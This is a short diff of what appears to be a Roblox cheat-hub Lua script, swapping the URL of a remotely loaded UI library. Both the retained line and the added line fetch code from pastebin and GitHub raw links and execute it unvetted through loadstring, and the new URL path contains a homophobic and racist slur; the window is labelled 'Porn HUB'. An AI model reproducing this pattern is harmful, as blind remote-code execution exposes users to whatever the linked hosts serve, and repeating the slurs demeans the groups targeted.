@@ -3,7 +3,7 @@
 loadstring(game:HttpGet("https://pastebin.com/raw/KrpD8Hgf"))()
 
 
-local library = loadstring(game:HttpGet("https://remhub.net/upload/ui.lua"))() -- cal the lib
+local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/XptzExploits/OTF/main/UI%20FOR%20GAY%20NIGGAS%20PT"))() -- cal the lib
 local a = library:NewWindow("Porn","HUB") -- Change to anything
 local b = a:NewSection("⭐")
 local c = a:NewSection("😎")
